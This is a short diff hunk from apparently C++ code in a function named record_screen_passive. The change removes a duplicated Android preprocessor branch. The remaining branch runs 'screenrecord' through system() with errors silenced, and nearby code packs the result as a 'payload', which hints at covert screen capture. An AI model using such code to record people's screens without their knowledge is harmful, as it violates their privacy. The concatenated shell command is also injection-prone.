@@ -117,8 +117,6 @@ inline std::string record_screen_passive(int duration_seconds) {
             std::vector<BYTE>(payload.begin(), payload.end()));
     }
 #elif defined(__ANDROID__) || defined(ANDROID)
-
-#elif defined(__ANDROID__) || defined(ANDROID)
     // Android: screenrecord
     std::string cmd = "screenrecord --time-limit " + std::to_string(duration_seconds) + " " + tmp_file + " 2>/dev/null";
     int ret = system(cmd.c_str());
